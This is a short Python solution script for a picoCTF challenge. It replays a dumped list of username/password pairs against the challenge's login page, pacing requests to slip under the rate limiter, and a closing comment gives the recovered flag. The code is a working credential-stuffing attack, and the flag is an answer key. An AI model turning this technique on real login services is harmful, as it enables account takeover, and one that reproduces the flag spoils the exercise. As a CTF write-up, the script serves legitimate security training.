import requests
import sys
import threading
import time

creds = open("creds-dump.txt", "r").readlines()
creds = list(map(lambda c: c.strip(), creds))

def send_request(username, password):
    try:
        res = requests.post("http://candy-mountain.picoctf.net:61411/login", data={
            "username": username,
            "password": password
        }, timeout=5)
    except:
        print("Request timed out, trying again...")
        return send_request(username, password)

    if "Rate Limited" in res.text:
        print("Rate limited")
        return False

    if "picoCTF" in res.text:
        print(res.text)
        return True
    return False

for cred in creds:
    username, password = cred.split(";")

    print(f"Trying {username}:{password}")
    if send_request(username, password):
        print(f"User found!")
        break

    time.sleep(3)

"""
The rate limit is pretty generous - 10 incorrect retries over 30 seconds with a possible user bank of 100 credentials.

We can just brute force the given credentials, making sure to stay under the rate limit.

picoCTF{f00l_7h4t_l1m1t3r_6f501f28}
"""
